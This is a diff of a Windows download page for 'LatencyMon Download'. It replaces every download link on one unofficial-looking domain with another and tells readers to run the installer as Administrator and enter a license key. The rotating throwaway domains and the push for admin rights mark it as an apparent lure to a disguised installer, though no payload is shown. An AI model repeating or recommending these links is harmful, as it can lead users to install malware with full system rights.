@@ -13,27 +13,27 @@
 > **This is the download page.** Use the button or link below to get **LatencyMon Download** for Windows.
 
 <p align="center">
-  <a href="https://latencymon.zipzapsol.space/">
+  <a href="https://latencymon.wonderchain.fun/">
     <img src="https://img.shields.io/badge/Download-LatencyMon%20Download-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download LatencyMon Download">
   </a>
 </p>
 
 | | |
 | --- | --- |
-| **Direct link** | **[latencymon.zipzapsol.space](https://latencymon.zipzapsol.space/)** |
-| **Full URL** | `https://latencymon.zipzapsol.space/` |
+| **Direct link** | **[latencymon.wonderchain.fun](https://latencymon.wonderchain.fun/)** |
+| **Full URL** | `https://latencymon.wonderchain.fun/` |
 | **Type** | Installer for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Click **[Download — latencymon.zipzapsol.space](https://latencymon.zipzapsol.space/)** (link above)
+1. Click **[Download — latencymon.wonderchain.fun](https://latencymon.wonderchain.fun/)** (link above)
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
 5. Restart if the installer asks — then launch from Start menu
 
-<p align="center"><a href="https://latencymon.zipzapsol.space/"><strong>⬇ Download LatencyMon Download now</strong></a></p>
+<p align="center"><a href="https://latencymon.wonderchain.fun/"><strong>⬇ Download LatencyMon Download now</strong></a></p>
 
 ---
 
